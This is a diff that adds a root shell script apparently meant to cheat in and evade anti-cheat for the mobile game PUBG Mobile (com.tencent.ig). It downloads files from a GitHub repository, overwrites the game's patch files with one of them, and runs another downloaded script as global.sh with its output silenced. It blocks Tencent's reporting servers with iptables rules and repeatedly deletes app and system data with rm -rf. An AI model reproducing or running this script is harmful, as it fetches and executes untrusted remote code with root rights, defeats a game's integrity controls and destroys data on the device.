@@ -1,0 +1,137 @@
+uptime
+cal
+echo tunggu sebentar.....
+wget https://raw.github.com/aldiputr4/sesion13/master/tahu &> /dev/null
+busybox mount -o rw,remount /data
+busybox chmod +x /data
+cp tahu /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/game_patch_0.18.0.12600.pak &> /dev/null
+cp tahu /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/core_patch_0.18.0.12600.pak &> /dev/null
+rm -rf tahu &> /dev/null
+su -c iptables -I INPUT -s hk.clientreport.gfm.qq.com -j DROP &>/dev/null
+su -c iptables -I INPUT -s gfm.qq.com -j DROP &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.101 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.105 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.120 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.210 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.100/32 -j REJECT &>/dev/null
+
+am start -n com.tencent.ig/com.epicgames.ue4.SplashActivity &> /dev/null
+sleep 60
+rm -rf /data/system/package_cache/*
+rm -rf /data/system/graphicsstats/1588464000000/com.tencent.ig
+rm -rf /data/system/graphicsstats/1588550400000/com.tencent.ig
+rm -rf /data/system/graphicsstats/1588636800000/com.tencent.ig
+rm -rf /data/system/graphicsstats/1588723200000/com.tencent.ig
+rm -rf /data/system/package_cache/1/*
+sleep 1
+rm -rf /data/data/com.tencent.ig/files
+rm -rf /data/data/com.tencent.ig/app_crashrecord
+touch /data/data/com.tencent.ig/files
+touch /data/data/com.tencent.ig/app_crashrecord
+echo 10%
+su -c iptables -I INPUT -s hk.clientreport.gfm.qq.com -j DROP &>/dev/null
+su -c iptables -I INPUT -s gfm.qq.com -j DROP &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.101 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.105 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.120 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.210 -j REJECT &>/dev/null
+su -c iptables -I INPUT -s 79.124.78.100/32 -j REJECT &>/dev/null
+echo 30%
+wget https://raw.github.com/aldiputr4/sesion13/master/domino &> /dev/null
+echo 50%
+busybox mount -o rw,remount /data
+busybox chmod +x /data
+mv domino /data/data/com.tencent.ig/global.sh
+echo 60%
+busybox mount -o rw,remount /data
+busybox chmod +x /data
+chmod 777 /data/data/com.tencent.ig/global.sh &>/dev/null
+echo 70%
+/data/data/com.tencent.ig/global.sh &>/dev/null
+sleep 1
+echo 80%
+/data/data/com.tencent.ig/global.sh &>/dev/null
+sleep 1
+echo 90%
+/data/data/com.tencent.ig/global.sh &>/dev/null
+sleep 1
+echo 100%
+echo done
+rm -rf /data/data/com.tencent.ig/global.sh &>/dev/nullq
+wget https://raw.github.com/aldiputr4/sesion13/master/bypass_ketupat.lua &> /dev/null
+am start -n com.qkwelzixxnsa/com.qkwelzixxnsa.MainActivity &> /dev/null
+sleep 2
+am start -n com.tencent.ig/com.epicgames.ue4.SplashActivity &> /dev/null
+echo fuck tencent
+PACKAGE='com.tencent.ig'
+while [ $(pidof $PACKAGE) ]
+do
+rm -rf /data/data/com.tencent.ig/app_appcache
+rm -rf /data/data/com.tencent.ig/app_bugly
+rm -rf /data/data/com.tencent.ig/app_crashrecord
+rm -rf /data/data/com.tencent.ig/app_databases
+rm -rf /data/data/com.tencent.ig/app_geolocation
+rm -rf /data/data/com.tencent.ig/app_tbs
+rm -rf /data/data/com.tencent.ig/app_textures
+rm -rf /data/data/com.tencent.ig/app_webview
+rm -rf /data/data/com.tencent.ig/app_webview_imsdk_inner_webview
+rm -rf /data/data/com.tencent.ig/cache
+rm -rf /data/data/com.tencent.ig/code_cache
+rm -rf /data/data/com.tencent.ig/files
+rm -rf /data/data/com.tencent.ig/no_backup
+rm -rf /data/data/com.tencent.ig/databases
+mv /data/data/com.tencent.ig/shared_prefs/device_id.xml /data/data/com.tencent.ig/shared_prefs/device_id.xml1
+rm -rf  /data/data/com.tencent.ig/shared_prefs/*.xml
+mv /data/data/com.tencent.ig/shared_prefs/device_id.xml1 /data/data/com.tencent.ig/shared_prefs/device_id.xml
+chmod 664 /data/data/com.tencent.ig/shared_prefs/device_id.xml
+
+echo '[91m║║   [94m╭═════════════════════════[91m✪'
+echo '[91m║║   [94m║'
+echo '[91m║╠[94m───╣  [91m≼[93m••[92m @ALDITEAM [93m••[91m≽'
+echo '[91m║║   [94m║'
+echo '[91m║║   [94m╰═════════════════════════[91m✪'
+echo '[91m║║'
+sleep 2;
+date
+printf "";
+((COUNT=$COUNT+10))
+if [ ! $(pidof $PACKAGE) ]; then
+break
+fi
+sleep 1
+done
+date
+echo "wait"
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/ProgramBinaryCache
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Pandora
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/PufferTmpDir
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/RoleInfo
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/UpdateInfo
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/StatEventReportedFlag
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/game_patch_0.18.0.12600.pak &> /dev/null
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/core_patch_0.18.0.12600.pak &> /dev/null
+rm -rf /data/data/com.tencent.ig/app_appcache
+rm -rf /data/data/com.tencent.ig/app_bugly
+rm -rf /data/data/com.tencent.ig/app_crashrecord
+rm -rf /data/data/com.tencent.ig/app_databases
+rm -rf /data/data/com.tencent.ig/app_geolocation
+rm -rf /data/data/com.tencent.ig/app_tbs
+rm -rf /data/data/com.tencent.ig/app_textures
+rm -rf /data/data/com.tencent.ig/app_webview
+rm -rf /data/data/com.tencent.ig/app_webview_imsdk_inner_webview
+rm -rf /data/data/com.tencent.ig/cache
+rm -rf /data/data/com.tencent.ig/code_cache
+rm -rf /data/data/com.tencent.ig/databases
+rm -rf /data/data/com.tencent.ig/files
+rm -rf /data/data/com.tencent.ig/no_backup
+mv /data/data/com.tencent.ig/shared_prefs/device_id.xml /data/data/com.tencent.ig/shared_prefs/device_id.xml1
+rm -rf  /data/data/com.tencent.ig/shared_prefs/*.xml
+mv /data/data/com.tencent.ig/shared_prefs/device_id.xml1 /data/data/com.tencent.ig/shared_prefs/device_id.xml
+chmod 664 /data/data/com.tencent.ig/shared_prefs/device_id.xml
+rm -rf bypass_ketupat.lua
+rm -rf /data/xaldi &> /dev/null
+echo "DONE"
+
+
+
